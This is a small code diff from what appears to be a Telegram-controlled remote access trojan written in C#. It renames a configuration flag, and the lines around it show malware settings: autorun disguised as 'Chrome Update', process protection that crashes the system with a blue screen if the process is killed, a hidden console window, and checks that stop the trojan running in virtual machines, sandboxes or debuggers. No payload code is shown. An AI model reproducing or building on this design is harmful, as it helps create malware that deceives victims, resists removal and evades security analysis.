@@ -25,7 +25,7 @@ namespace TelegramRAT
         public static bool AutorunEnabled = true;
         public static string AutorunName = "Chrome Update";
         // Protect process with BSoD (if killed).
-        public static bool ProcessProtectionEnabled = true;
+        public static bool ProcessBSODProtectionEnabled = true;
         // Hide console window. Need for debugging.
         public static bool HideConsoleWindow = true;
         // Do not start trojan if it running in VirtualBox, VMWare, SandBoxie, Debuggers.
